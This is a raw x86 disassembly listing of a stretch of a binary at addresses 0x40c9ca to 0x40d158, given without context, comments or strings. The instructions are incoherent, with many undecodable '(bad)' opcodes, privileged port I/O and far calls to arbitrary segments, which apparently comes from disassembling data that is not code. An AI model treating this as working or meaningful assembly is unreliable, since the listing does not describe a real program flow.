  40c9ca:	imul   ebp,DWORD PTR [ecx+esi*2-0x56],0xa430f6dd
  40c9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d3:	mov    ds:0xde7632e4,al
  40c9d8:	xchg   edx,eax
  40c9d9:	ja     0x40c95d
  40c9db:	icebp  
  40c9dc:	(bad)  
  40c9de:	xor    ah,bl
  40c9e0:	jno    0x40c9d8
  40c9e2:	and    ecx,edx
  40c9e4:	inc    edi
  40c9e5:	adc    esp,esp
  40c9e7:	leave  
  40c9e8:	retf   0x2ca4
  40c9eb:	out    0x4f,eax
  40c9ed:	and    bl,BYTE PTR [edi+ecx*1]
  40c9f0:	or     DWORD PTR [ecx+0x5c32cdf0],esi
  40c9f6:	mov    eax,0x9e3e92ba
  40c9fb:	bound  edx,QWORD PTR ds:0x9df28adc
  40ca01:	push   edx
  40ca02:	sub    al,0xd1
  40ca04:	lea    esi,[bp+si]
  40ca07:	pop    ss
  40ca08:	mov    ebp,0x59ae46f2
  40ca0d:	adc    ebp,DWORD PTR [esi-0x35bce134]
  40ca13:	lods   eax,DWORD PTR ds:[esi]
  40ca14:	xor    edi,DWORD PTR [esi+0x17]
  40ca17:	sub    eax,edx
  40ca19:	rcr    BYTE PTR [ecx+0x5b],0x10
  40ca1d:	sti    
  40ca1e:	loopne 0x40ca10
  40ca20:	sti    
  40ca21:	repz lock and al,0x56
  40ca25:	fsubrp st(5),st
  40ca27:	aam    0x7a
  40ca29:	mov    dh,0x33
  40ca2b:	dec    esp
  40ca2c:	push   ss
  40ca2d:	clc    
  40ca2e:	dec    ecx
  40ca2f:	addr16 neg ch
  40ca32:	add    eax,DWORD PTR gs:[eax+0x18]
  40ca36:	xchg   BYTE PTR [eax-0x6a],cl
  40ca39:	pop    ebx
  40ca3a:	aas    
  40ca3b:	inc    ecx
  40ca3c:	and    bh,BYTE PTR [edx+0x833008d]
  40ca42:	daa    
  40ca43:	push   ecx
  40ca44:	retf   0xe851
  40ca47:	jg     0x40ca6d
  40ca49:	push   cs
  40ca4a:	dec    eax
  40ca4b:	enter  0x2254,0x66
  40ca4f:	sub    ebx,eax
  40ca51:	pop    esi
  40ca52:	loopne 0x40ca11
  40ca54:	dec    ebx
  40ca55:	push   0xa563f867
  40ca5a:	daa    
  40ca5b:	push   ecx
  40ca5c:	lock push cs
  40ca5e:	pusha  
  40ca5f:	adc    eax,0xd13d2347
  40ca64:	adc    al,0x14
  40ca66:	lds    ebp,FWORD PTR [ebp+0x4c98847b]
  40ca6c:	sub    ah,dh
  40ca6e:	in     eax,0xcb
  40ca70:	xor    BYTE PTR [edx],al
  40ca72:	out    0xa9,al
  40ca74:	shl    DWORD PTR [ebx],0x89
  40ca77:	loop   0x40caf0
  40ca79:	mov    eax,0xd5210932
  40ca7e:	jg     0x40cace
  40ca80:	test   DWORD PTR [esi+0x34d662ad],esi
  40ca86:	mov    ebx,0xe1f7f25a
  40ca8b:	xor    eax,0xd2dfd8ee
  40ca90:	mov    edi,0x98a3eed3
  40ca95:	dec    ebx
  40ca96:	push   es
  40ca97:	clc    
  40ca98:	test   DWORD PTR [eax],edx
  40ca9a:	loopne 0x40ca34
  40ca9c:	cld    
  40ca9d:	or     al,0xf9
  40ca9f:	pop    esp
  40caa0:	bound  edx,QWORD PTR [ecx-0x29]
  40caa3:	xor    al,0x7a
  40caa5:	lahf   
  40caa6:	and    DWORD PTR [edx+0x5fc52785],0x41c194a5
  40cab0:	dec    ecx
  40cab1:	adc    eax,0xf5fa1e08
  40cab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cab7:	mov    eax,0x6c7de83a
  40cabc:	je     0x40cb22
  40cabe:	fwait
  40cabf:	mov    ds:0x2d78bd32,al
  40cac4:	mov    bh,0xdb
  40cac6:	pop    DWORD PTR [ecx-0x79]
  40cac9:	adc    al,0x47
  40cacb:	cmp    DWORD PTR [ecx],ecx
  40cacd:	sub    cl,ah
  40cacf:	pop    esp
  40cad0:	and    DWORD PTR [edx-0x5a],ebp
  40cad3:	cwde   
  40cad4:	xchg   ebp,eax
  40cad5:	mov    bh,0x55
  40cad7:	pop    esp
  40cad8:	cmp    eax,DWORD PTR [ebx]
  40cada:	and    bh,dh
  40cadc:	xchg   esi,eax
  40cadd:	jb     0x40caed
  40cadf:	mov    ch,0x7
  40cae1:	xor    edi,DWORD PTR [esi-0x1a]
  40cae4:	imul   esi,DWORD PTR [eax+0x511c2502],0xf6156401
  40caee:	(bad)  
  40caf0:	jecxz  0x40caff
  40caf2:	(bad)  
  40caf3:	(bad)  
  40caf4:	sar    BYTE PTR [esi+0x4bfe88d0],1
  40cafa:	cwde   
  40cafb:	push   0xffffffef
  40cafd:	ret    0xac6
  40cb00:	in     eax,0x70
  40cb02:	xor    al,0x4f
  40cb04:	pop    es
  40cb05:	out    dx,eax
  40cb06:	out    dx,eax
  40cb07:	or     DWORD PTR [esi],edi
  40cb09:	dec    ebp
  40cb0a:	mov    BYTE PTR [ebp-0x79],0xec
  40cb0e:	push   cs
  40cb0f:	test   BYTE PTR [ebp+0x2a],dl
  40cb12:	jle    0x40cabd
  40cb14:	push   ds
  40cb15:	call   0x8b2c:0x148c70a
  40cb1c:	fs adc dl,0xe9
  40cb20:	cmp    BYTE PTR [edx+0x5ff7ab56],dh
  40cb26:	xchg   edi,eax
  40cb27:	test   DWORD PTR ss:[ecx+0x42],edx
  40cb2b:	(bad)  
  40cb2c:	xor    ebx,DWORD PTR [ebp-0xf1e9acf]
  40cb32:	daa    
  40cb33:	mov    ch,0x27
  40cb35:	or     al,0xd7
  40cb37:	icebp  
  40cb38:	adc    cl,BYTE PTR [eax+0x24]
  40cb3b:	xchg   ebx,eax
  40cb3c:	loop   0x40cb4d
  40cb3e:	add    eax,0x32a3479d
  40cb43:	pop    ebx
  40cb44:	sar    ch,0xdf
  40cb47:	mov    al,0xe9
  40cb49:	jecxz  0x40caf7
  40cb4b:	lods   al,BYTE PTR ss:[esi]
  40cb4d:	inc    edx
  40cb4e:	or     edi,DWORD PTR [eax-0x54]
  40cb51:	xor    eax,esp
  40cb53:	or     esi,edi
  40cb55:	cmp    al,0x4c
  40cb57:	adc    BYTE PTR ds:0xa4032cf9,al
  40cb5d:	push   ss
  40cb5e:	sub    BYTE PTR [ebx+0x71],ah
  40cb61:	or     al,0x7c
  40cb63:	out    dx,eax
  40cb64:	jl     0x40cb69
  40cb66:	int    0xec
  40cb68:	pop    esi
  40cb69:	dec    edx
  40cb6a:	adc    cl,BYTE PTR [edx+edx*4]
  40cb6d:	xchg   edx,eax
  40cb6e:	mov    bh,0x60
  40cb70:	xchg   DWORD PTR [esi],eax
  40cb72:	rol    BYTE PTR [esi],cl
  40cb74:	enter  0xa9cc,0x91
  40cb78:	mov    ecx,edx
  40cb7a:	dec    ecx
  40cb7b:	faddp  st(1),st
  40cb7d:	(bad)  
  40cb7e:	mov    ah,0xbb
  40cb80:	or     eax,0x576dae88
  40cb85:	in     eax,dx
  40cb86:	jo     0x40cb69
  40cb88:	rcl    edx,0xf0
  40cb8b:	inc    ecx
  40cb8c:	shl    BYTE PTR [esp+ebp*1-0x76063c71],cl
  40cb93:	cwde   
  40cb94:	dec    edx
  40cb95:	(bad)  [edx-0x3c]
  40cb98:	or     DWORD PTR [edi],ecx
  40cb9a:	mov    bl,0xfc
  40cb9c:	xchg   edi,eax
  40cb9d:	bound  esi,QWORD PTR [edx+0x1697e3ec]
  40cba3:	leave  
  40cba4:	cmp    dl,ch
  40cba6:	dec    edx
  40cba7:	mov    bl,0xeb
  40cba9:	sub    DWORD PTR [esi],0x732ca4c0
  40cbaf:	shl    DWORD PTR ss:0x12de635,0xff
  40cbb7:	test   ebx,eax
  40cbb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbba:	icebp  
  40cbbb:	sahf   
  40cbbc:	out    dx,eax
  40cbbd:	popa   
  40cbbe:	adc    eax,DWORD PTR [eax+0x44331ca]
  40cbc4:	add    al,0x7b
  40cbc7:	pop    ebp
  40cbc8:	add    ch,bh
  40cbca:	sbb    eax,DWORD PTR [bp+di+0x64db]
  40cbcf:	or     BYTE PTR ds:0xec8b8c8,ch
  40cbd5:	xchg   BYTE PTR [ebx],ch
  40cbd7:	mov    edx,0x99f7689
  40cbdc:	jmp    0x40cbb6
  40cbde:	clc    
  40cbdf:	push   ebx
  40cbe0:	sbb    eax,0xf1c7d139
  40cbe5:	jbe    0x40cb88
  40cbe7:	sub    DWORD PTR ds:0x8da36361,0xfffffff2
  40cbee:	les    esi,FWORD PTR [eax]
  40cbf0:	les    eax,FWORD PTR [ecx]
  40cbf2:	call   0x58b27705
  40cbf7:	or     eax,0x5fd1ca9
  40cbfc:	mov    ch,BYTE PTR [eax+eax*4-0x61]
  40cc00:	jl     0x40cc81
  40cc02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc03:	dec    eax
  40cc04:	and    eax,0x677efaed
  40cc09:	stos   BYTE PTR es:[edi],al
  40cc0a:	ja     0x40cbc9
  40cc0c:	test   al,0xa7
  40cc0e:	or     al,0x41
  40cc10:	sbb    al,0x13
  40cc12:	mov    edi,0xe8663a8e
  40cc17:	pop    ebp
  40cc18:	push   cs
  40cc19:	scas   eax,DWORD PTR es:[edi]
  40cc1a:	sar    dl,1
  40cc1c:	imul   esi,ebp,0x1f
  40cc1f:	cdq    
  40cc20:	ret    0x5e8c
  40cc23:	daa    
  40cc24:	nop
  40cc25:	loop   0x40cbf5
  40cc27:	mov    ebx,0xdcd9a91f
  40cc2c:	cmp    ebp,ebx
  40cc2e:	and    ah,cl
  40cc30:	out    dx,al
  40cc31:	adc    al,0x24
  40cc33:	mov    ds:0x1fc61ca9,eax
  40cc38:	dec    ecx
  40cc39:	adc    BYTE PTR [eax+0x43],al
  40cc3c:	xor    BYTE PTR [eax+0x7de1d7b1],dl
  40cc42:	cld    
  40cc43:	mov    ds:0x86b271f7,al
  40cc48:	gs sub al,0xae
  40cc4b:	cmp    esp,DWORD PTR [ebx+0x26]
  40cc4e:	out    dx,eax
  40cc4f:	cwde   
  40cc50:	pop    es
  40cc51:	(bad)  
  40cc52:	sbb    eax,0x93db96d2
  40cc57:	stc    
  40cc58:	mov    bl,0xdc
  40cc5a:	in     al,0xbf
  40cc5c:	mov    edx,0xbe8effef
  40cc61:	cli    
  40cc62:	cwde   
  40cc63:	sti    
  40cc64:	call   0x692e:0x31f86bf2
  40cc6b:	fild   DWORD PTR [ebp+0x9c5ecc0]
  40cc71:	cs (bad) 
  40cc73:	jmp    0x372e:0x97b0071f
  40cc7a:	test   eax,0x5a410988
  40cc7f:	addr16 out dx,al
  40cc81:	xor    BYTE PTR [ebp-0x4],dl
  40cc84:	in     eax,0x9f
  40cc86:	jmp    0xd0800bf1
  40cc8b:	push   esi
  40cc8c:	in     eax,0xf7
  40cc8e:	mov    al,ds:0xbf3f10ee
  40cc93:	push   edx
  40cc94:	dec    ebp
  40cc95:	(bad)  
  40cc97:	loop   0x40cc79
  40cc99:	int3   
  40cc9a:	pop    ecx
  40cc9b:	xor    al,0x6c
  40cc9d:	jno    0x40cceb
  40cc9f:	push   ebx
  40cca0:	adc    eax,0x392994be
  40cca5:	mov    DWORD PTR [edx+0x7a],edx
  40cca8:	pop    eax
  40cca9:	call   0x58a1:0x8a3ed46a
  40ccb0:	arpl   bx,cx
  40ccb2:	mov    ch,0x82
  40ccb4:	add    eax,0xb97611e1
  40ccb9:	fwait
  40ccba:	inc    ebx
  40ccbb:	test   BYTE PTR ds:0x2904d976,dl
  40ccc1:	xchg   ebp,eax
  40ccc2:	cs (bad) 
  40ccc4:	push   0x9
  40ccc6:	mov    DWORD PTR [ebp+ebx*2-0xf08ceef],edx
  40cccd:	rcr    BYTE PTR [edi+0x29418c19],cl
  40ccd3:	sub    BYTE PTR [eax],dh
  40ccd5:	fcomp  st(3)
  40ccd7:	inc    ecx
  40ccd8:	mov    edi,0xeceecb4
  40ccdd:	out    dx,al
  40ccde:	cmp    ebx,DWORD PTR [edi-0x32]
  40cce1:	sbb    cl,ah
  40cce3:	xchg   esi,eax
  40cce4:	mov    al,ds:0xfedbee8c
  40cce9:	aaa    
  40ccea:	dec    ebp
  40cceb:	ins    DWORD PTR es:[edi],dx
  40ccec:	les    ebp,FWORD PTR [edi-0x3a]
  40ccef:	sahf   
  40ccf0:	mov    fs,WORD PTR [ebp-0xb]
  40ccf3:	cmp    DWORD PTR [eax+esi*1-0x6d375b25],edx
  40ccfa:	inc    edx
  40ccfb:	mov    dl,0x9
  40ccfd:	ror    ah,0x70
  40cd00:	and    bh,cl
  40cd02:	or     al,0x99
  40cd04:	push   ecx
  40cd05:	or     ch,BYTE PTR [ebx+0x2cd3d432]
  40cd0b:	push   eax
  40cd0c:	inc    esp
  40cd0d:	pop    edx
  40cd0e:	adc    ch,BYTE PTR gs:0x3a3fe1e4
  40cd15:	cmc    
  40cd16:	aad    0x38
  40cd18:	and    BYTE PTR ds:0xb2f08162,ah
  40cd1e:	and    DWORD PTR [edi],ebx
  40cd20:	repz push edi
  40cd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd23:	retf   0x33c9
  40cd26:	fidiv  DWORD PTR [ebx-0x37ee8ede]
  40cd2c:	push   0x0
  40cd2e:	daa    
  40cd2f:	jecxz  0x40ccd2
  40cd31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd32:	arpl   bx,bx
  40cd34:	in     al,0x2f
  40cd36:	scas   ax,WORD PTR es:[edi]
  40cd38:	mov    eax,ds:0xac648922
  40cd3d:	push   edx
  40cd3e:	or     dl,BYTE PTR [edx]
  40cd40:	bound  ecx,QWORD PTR [esi-0x34ca16a6]
  40cd46:	push   eax
  40cd47:	add    edx,ebp
  40cd49:	(bad)  
  40cd4a:	je     0x40cd37
  40cd4c:	add    eax,0x848c91d7
  40cd51:	mov    esi,DWORD PTR [esi+ebx*2-0x3b7c313e]
  40cd58:	aam    0x63
  40cd5a:	std    
  40cd5b:	out    dx,al
  40cd5c:	hlt    
  40cd5d:	adc    BYTE PTR [di+0x3b4a],al
  40cd62:	test   al,0xbf
  40cd64:	dec    esi
  40cd65:	jns    0x40cd0f
  40cd67:	mov    bh,0xcf
  40cd69:	fld    QWORD PTR fs:[edi-0x4e6c0d96]
  40cd70:	or     esi,DWORD PTR [edx+0x502447aa]
  40cd76:	leave  
  40cd77:	pop    edx
  40cd78:	scas   eax,DWORD PTR es:[edi]
  40cd79:	rep stos BYTE PTR es:[edi],al
  40cd7b:	rcr    BYTE PTR [eax+0x29bfb633],1
  40cd81:	cld    
  40cd82:	mov    eax,0x5012878e
  40cd87:	mov    ebx,0xa07d6a22
  40cd8c:	jmp    0x40cd94
  40cd8e:	inc    esi
  40cd8f:	in     al,0x90
  40cd91:	pop    esi
  40cd92:	mov    ebx,0x636b7792
  40cd97:	xor    DWORD PTR [ecx],ebp
  40cd99:	push   ebp
  40cd9a:	mov    dl,0x21
  40cd9c:	jle    0x40cd37
  40cd9e:	std    
  40cd9f:	jnp    0x40cdcc
  40cda1:	or     edx,ebp
  40cda3:	xchg   ecx,eax
  40cda4:	cld    
  40cda5:	adc    eax,0xdbaca9d5
  40cdaa:	push   0xf5a88831
  40cdaf:	cmp    edx,DWORD PTR [edx]
  40cdb1:	mov    eax,ds:0x87d7c5c4
  40cdb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdb7:	in     al,0x72
  40cdb9:	cli    
  40cdba:	jbe    0x40cd6d
  40cdbc:	dec    esp
  40cdbd:	les    edx,FWORD PTR [esi-0x4f2b2aee]
  40cdc3:	fwait
  40cdc4:	aam    0x9c
  40cdc6:	repnz mov ds:0x3c99a722,eax
  40cdcc:	mov    BYTE PTR [edi+0x4],dl
  40cdcf:	arpl   WORD PTR [ebx],ax
  40cdd1:	popf   
  40cdd2:	inc    esp
  40cdd3:	fadd   DWORD PTR [edi+0x2]
  40cdd6:	xor    dh,cl
  40cdd8:	in     al,dx
  40cdd9:	inc    esp
  40cdda:	mov    edi,0xd6c2feb5
  40cddf:	jnp    0x40cd80
  40cde1:	mov    ecx,DWORD PTR [ebx]
  40cde3:	leave  
  40cde4:	dec    ebx
  40cde5:	adc    al,0xc2
  40cde7:	mov    edx,DWORD PTR [eax]
  40cde9:	retf   
  40cdea:	pop    es
  40cdeb:	je     0x40ce18
  40cded:	cmp    ebp,DWORD PTR [edi]
  40cdef:	aaa    
  40cdf0:	dec    edx
  40cdf1:	icebp  
  40cdf2:	mov    dl,0xb9
  40cdf4:	ret    0x79ae
  40cdf7:	fild   WORD PTR [ebx]
  40cdf9:	in     eax,dx
  40cdfa:	or     BYTE PTR [ebx+0x70],al
  40cdfd:	std    
  40cdfe:	out    0x6b,al
  40ce00:	add    al,0xfc
  40ce02:	cmp    al,0xc9
  40ce04:	xchg   edx,eax
  40ce05:	adc    DWORD PTR [edi+0x7f117857],ebx
  40ce0b:	pop    edi
  40ce0c:	das    
  40ce0d:	fdiv   DWORD PTR [esi+ebx*2]
  40ce10:	adc    ebx,eax
  40ce12:	nop
  40ce13:	push   cs
  40ce14:	popa   
  40ce15:	mov    cl,0x1
  40ce17:	and    al,BYTE PTR [ebp+0x150e6780]
  40ce1d:	jb     0x40ce4b
  40ce1f:	inc    esp
  40ce20:	jo     0x40cdad
  40ce22:	es inc ebp
  40ce24:	pop    esi
  40ce25:	mov    al,ds:0x9d034cad
  40ce2a:	fwait
  40ce2b:	jg     0x40cde6
  40ce2d:	in     al,0x9d
  40ce2f:	inc    ebp
  40ce30:	dec    ecx
  40ce31:	(bad)  [ecx-0x7640438e]
  40ce37:	scas   al,BYTE PTR es:[edi]
  40ce38:	in     al,0x4f
  40ce3a:	les    esp,FWORD PTR [ebx-0x11]
  40ce3d:	hlt    
  40ce3e:	push   esi
  40ce3f:	and    BYTE PTR [ecx],0x82
  40ce42:	inc    eax
  40ce43:	ja     0x40ce38
  40ce45:	adc    BYTE PTR [bx],0xc7
  40ce49:	cmp    al,0xd6
  40ce4b:	add    bl,BYTE PTR [eax+0x7d19fdc1]
  40ce51:	cmp    dl,BYTE PTR [ebx+0x420699d7]
  40ce57:	sub    cl,BYTE PTR [ecx]
  40ce59:	pop    ebx
  40ce5a:	push   0x49d0b4c0
  40ce5f:	arpl   WORD PTR [ebp+0x4867685f],ax
  40ce65:	sbb    eax,0x85ec7a15
  40ce6a:	adc    BYTE PTR [ecx-0x5e3f0225],0x4d
  40ce71:	imul   edi,DWORD PTR [ebx-0x615b4a90],0x19
  40ce78:	arpl   bx,bx
  40ce7a:	xchg   esi,eax
  40ce7b:	stos   BYTE PTR es:[edi],al
  40ce7c:	or     al,0x3a
  40ce7e:	inc    edx
  40ce7f:	xor    ebp,0x3b
  40ce82:	test   DWORD PTR [edi+0x4828b2cc],eax
  40ce88:	loopne 0x40cec1
  40ce8a:	adc    DWORD PTR [esi-0x62be6599],0xffffffb0
  40ce91:	adc    DWORD PTR [edi+0x6651d8e2],ebx
  40ce97:	dec    esi
  40ce98:	cmp    al,0x8e
  40ce9a:	jno    0x40cec5
  40ce9c:	ret    0xdda3
  40ce9f:	dec    ecx
  40cea0:	dec    esi
  40cea1:	pop    edx
  40cea2:	cli    
  40cea3:	out    dx,eax
  40cea4:	(bad)
  40cea7:	(bad)  
  40cea8:	xchg   edx,eax
  40cea9:	xchg   edx,eax
  40ceaa:	in     eax,0x21
  40ceac:	adc    eax,0x9010edc9
  40ceb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceb2:	fwait
  40ceb3:	xchg   esp,eax
  40ceb4:	call   DWORD PTR [edi-0x5f9e8f66]
  40ceba:	adc    DWORD PTR ds:0xaf967cb6,edx
  40cec0:	jno    0x40ce74
  40cec2:	pop    esi
  40cec3:	popa   
  40cec4:	add    edx,DWORD PTR [ebp+0x2a224a11]
  40ceca:	cs clc 
  40cecc:	sub    al,0xeb
  40cece:	ja     0x40ce99
  40ced0:	pop    ecx
  40ced1:	shl    DWORD PTR [ecx],0x57
  40ced4:	popf   
  40ced5:	ja     0x40ceeb
  40ced7:	inc    edx
  40ced8:	ret    0x503f
  40cedb:	or     DWORD PTR [edi-0x48],edx
  40cede:	stos   DWORD PTR es:[edi],eax
  40cedf:	push   esp
  40cee0:	sub    DWORD PTR [edx+0x10987f0d],esp
  40cee6:	ja     0x40cf2f
  40cee8:	jl     0x40cf5b
  40ceea:	add    DWORD PTR [edx+0x56],edx
  40ceed:	push   cs
  40ceee:	adc    edx,edx
  40cef0:	shr    BYTE PTR [edi],0xd7
  40cef3:	aaa    
  40cef4:	push   edi
  40cef5:	iret   
  40cef6:	add    eax,0x8c8a2836
  40cefb:	jb     0x40cf3d
  40cefd:	ja     0x40cf71
  40ceff:	push   ds
  40cf00:	arpl   si,cx
  40cf02:	ret    0x8ad5
  40cf05:	int3   
  40cf06:	and    dh,ah
  40cf08:	out    dx,al
  40cf09:	cmp    al,0xd2
  40cf0b:	cmp    ebx,esp
  40cf0d:	into   
  40cf0e:	xor    DWORD PTR [ebp-0x47],ebx
  40cf11:	lock test eax,0x2559ab9c
  40cf17:	mov    ds:0xd7a1720b,al
  40cf1d:	mov    ebx,DWORD PTR [edi-0x56]
  40cf20:	lahf   
  40cf21:	neg    DWORD PTR ds:0xddc12e8
  40cf27:	mov    eax,0xdd1419d8
  40cf2c:	pop    eax
  40cf2d:	adc    DWORD PTR [eax+0x79],edx
  40cf30:	mov    ch,ah
  40cf32:	add    eax,0xadea8f4e
  40cf37:	xchg   esi,eax
  40cf38:	xor    edi,DWORD PTR [edi+0x5d813c41]
  40cf3e:	sub    al,0xa0
  40cf40:	dec    esp
  40cf41:	push   eax
  40cf42:	aas    
  40cf43:	mov    dh,0x6
  40cf45:	dec    edi
  40cf46:	lods   eax,DWORD PTR ds:[esi]
  40cf47:	and    BYTE PTR [ebx+0x7745c299],0xfe
  40cf4e:	pop    ss
  40cf4f:	setno  BYTE PTR ss:[esp+eax*4]
  40cf54:	sahf   
  40cf55:	xor    DWORD PTR [edx+0x3b],edx
  40cf58:	mov    eax,0x96063caf
  40cf5d:	adc    DWORD PTR [edi+0x369e1d62],0xb2c2b98
  40cf67:	stc    
  40cf68:	sub    esp,DWORD PTR [ebx+0x57]
  40cf6b:	push   cs
  40cf6c:	and    ebx,DWORD PTR [edi+0x263fe2c2]
  40cf72:	dec    eax
  40cf73:	in     al,0xde
  40cf75:	adc    DWORD PTR [esi-0x50],ecx
  40cf78:	sub    eax,DWORD PTR ds:0xa7d8f2a7
  40cf7e:	sub    al,0x1f
  40cf80:	mov    bl,BYTE PTR [edi-0x43de32f2]
  40cf86:	push   esp
  40cf87:	mov    bh,0x6d
  40cf89:	cli    
  40cf8a:	ret    
  40cf8b:	mov    bh,0x14
  40cf8d:	mov    esp,0x4b5d398e
  40cf92:	mov    bh,0xc2
  40cf94:	lods   al,BYTE PTR ds:[esi]
  40cf95:	sub    DWORD PTR [eax],edx
  40cf97:	loope  0x40cf62
  40cf99:	mov    bl,0xb8
  40cf9b:	shl    bh,cl
  40cf9d:	in     al,dx
  40cf9e:	inc    ebp
  40cf9f:	call   0xf4d3:0x6f8fef07
  40cfa6:	dec    ebx
  40cfa7:	rcl    DWORD PTR [edx+ebp*1-0x66bd3347],1
  40cfae:	push   0x961bb8f9
  40cfb3:	dec    ebp
  40cfb4:	(bad)  
  40cfb5:	push   edx
  40cfb6:	imul   ebp,DWORD PTR [edx+0x3fe1d64],0x816ef9e9
  40cfc0:	lods   eax,DWORD PTR ds:[esi]
  40cfc1:	push   esp
  40cfc2:	inc    ebx
  40cfc3:	ss sbb esp,esp
  40cfc6:	pop    edx
  40cfc7:	dec    edx
  40cfc8:	adc    ecx,DWORD PTR [ecx+0x74]
  40cfcb:	cmp    DWORD PTR [eax+0x7e],edx
  40cfce:	ja     0x40cf6b
  40cfd0:	fwait
  40cfd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfd2:	icebp  
  40cfd3:	or     esp,ebx
  40cfd5:	arpl   WORD PTR [esi],sp
  40cfd7:	fs data16 aam 0xdb
  40cfdb:	pushf  
  40cfdc:	(bad)  
  40cfdd:	xor    al,0xca
  40cfdf:	adc    al,0x25
  40cfe1:	fisttp WORD PTR [edi]
  40cfe3:	daa    
  40cfe4:	(bad)  
  40cfe6:	pop    esp
  40cfe7:	data16 ins BYTE PTR es:[edi],dx
  40cfe9:	pop    ds
  40cfea:	std    
  40cfeb:	clc    
  40cfec:	sbb    BYTE PTR [esi+0xf28cc69],dh
  40cff2:	inc    esi
  40cff3:	das    
  40cff4:	push   esp
  40cff5:	jle    0x40cfec
  40cff7:	es jp  0x40d002
  40cffa:	int    0xd9
  40cffc:	mov    dl,0x1b
  40cffe:	pushf  
  40cfff:	ds js  0x40cfdd
  40d002:	sbb    al,0x95
  40d004:	mov    ebx,0x81b62686
  40d009:	mov    ecx,0x90d62440
  40d00e:	fadd   st(3),st
  40d010:	fnstsw WORD PTR [eax-0x2d7c411a]
  40d016:	scas   al,BYTE PTR es:[edi]
  40d017:	pop    ds
  40d018:	cmp    edi,DWORD PTR [ecx-0x5e80f7a9]
  40d01e:	cmp    DWORD PTR [esi-0x6ff378d5],0x42
  40d025:	and    al,0x18
  40d027:	pop    eax
  40d028:	xor    bl,dl
  40d02a:	push   0x2392791f
  40d02f:	jne    0x40d08a
  40d031:	scas   al,BYTE PTR es:[edi]
  40d032:	shl    ebp,1
  40d034:	rol    dh,0xd7
  40d037:	jne    0x40cfdb
  40d039:	sub    BYTE PTR [edi-0x1c7e297f],0xb3
  40d040:	sar    DWORD PTR [ebx],cl
  40d042:	div    DWORD PTR [ebp-0x55e6806b]
  40d048:	push   ds
  40d049:	or     DWORD PTR [ebx],edi
  40d04b:	sar    ah,cl
  40d04d:	and    cl,ch
  40d04f:	adc    ecx,DWORD PTR [eax]
  40d051:	jo     0x40d0b0
  40d053:	mov    cl,0xa9
  40d055:	dec    ebp
  40d056:	mov    dl,0xa2
  40d058:	out    0xd9,al
  40d05a:	sub    al,0xf5
  40d05c:	mov    esi,0x137911a
  40d061:	test   bl,dl
  40d063:	repz ficom WORD PTR [ecx]
  40d066:	fwait
  40d067:	mov    eax,ds:0x6569719f
  40d06c:	mov    al,al
  40d06e:	dec    esi
  40d06f:	ficom  WORD PTR [esp+ebx*1-0x12ca3763]
  40d076:	sub    BYTE PTR [edx+eax*8-0x40],bh
  40d07a:	dec    esp
  40d07b:	mov    eax,ds:0x73556796
  40d080:	stc    
  40d081:	or     eax,0xb55d3ac
  40d086:	into   
  40d087:	imul   eax,ebp,0x5c
  40d08a:	xchg   ecx,eax
  40d08b:	mov    eax,ds:0xbae3aace
  40d090:	xor    eax,ecx
  40d092:	retf   
  40d093:	inc    BYTE PTR [eax-0x3d]
  40d096:	test   DWORD PTR [edi+ebx*8-0x9],0x18d57b2a
  40d09e:	or     bl,BYTE PTR [ebx]
  40d0a0:	or     ebx,DWORD PTR [edi-0x4a]
  40d0a3:	xor    eax,0xc459c657
  40d0a8:	out    0xaf,al
  40d0aa:	rcl    BYTE PTR [ecx],1
  40d0ac:	fwait
  40d0ad:	ret    0xdf8d
  40d0b0:	aad    0x36
  40d0b2:	or     BYTE PTR [edx],bh
  40d0b4:	xchg   BYTE PTR [ebx-0x45d37a74],bh
  40d0ba:	xchg   ebx,eax
  40d0bb:	pushf  
  40d0bc:	in     al,0x38
  40d0be:	out    dx,eax
  40d0bf:	pop    ss
  40d0c0:	inc    eax
  40d0c1:	jmp    0xa1c2b5a4
  40d0c6:	sar    bl,1
  40d0c8:	dec    esi
  40d0c9:	fwait
  40d0ca:	std    
  40d0cb:	mov    esp,0xa415f0d5
  40d0d0:	sti    
  40d0d1:	dec    edx
  40d0d2:	js     0x40d0a7
  40d0d4:	sub    DWORD PTR [ecx+esi*1-0x58],esi
  40d0d8:	in     al,dx
  40d0d9:	arpl   WORD PTR [ebx-0x5ac924b0],di
  40d0df:	mov    ah,0x9b
  40d0e1:	fldenv cs:[ebp-0xe]
  40d0e5:	xchg   esi,eax
  40d0e6:	mov    dl,0x7b
  40d0e8:	cmp    BYTE PTR [edi+edx*1+0x4c638de3],ah
  40d0ef:	mov    esi,0xac45a0b1
  40d0f4:	sub    al,0x4b
  40d0f6:	inc    ebp
  40d0f7:	or     edi,DWORD PTR [edi]
  40d0f9:	sbb    BYTE PTR [ecx-0x20db9344],bh
  40d0ff:	jge    0x40d151
  40d101:	pushf  
  40d102:	lods   al,BYTE PTR ds:[esi]
  40d103:	(bad)  
  40d104:	and    esi,DWORD PTR [edx-0x5955da1f]
  40d10a:	and    bl,al
  40d10c:	xchg   edi,eax
  40d10d:	repz sub DWORD PTR [ebp-0x5eb0717c],eax
  40d114:	int    0x45
  40d116:	mov    edx,0xd7c9a08c
  40d11b:	push   edx
  40d11c:	add    eax,0x4458ace
  40d121:	jmp    0x9236:0x3cbd4e0f
  40d128:	je     0x40d102
  40d12a:	mov    cl,BYTE PTR [edx-0x7a]
  40d12d:	icebp  
  40d12e:	push   esp
  40d12f:	loopne 0x40d157
  40d131:	sbb    dl,ch
  40d133:	out    dx,al
  40d134:	gs inc edi
  40d136:	mov    ds:0x37adecaf,eax
  40d13b:	imul   ecx,DWORD PTR es:[edx-0x17],0xffffffe7
  40d140:	mov    bl,0x3d
  40d142:	and    al,0xa6
  40d144:	jg     0x40d1a4
  40d146:	es (bad) 
  40d148:	aam    0x38
  40d14a:	lds    edx,FWORD PTR [ebx-0x80]
  40d14d:	cdq    
  40d14e:	loope  0x40d1cb
  40d150:	mov    al,ds:0xa5be04c4
  40d155:	cs jnp 0x40d0e0
  40d158:	mov    cl,0xf8
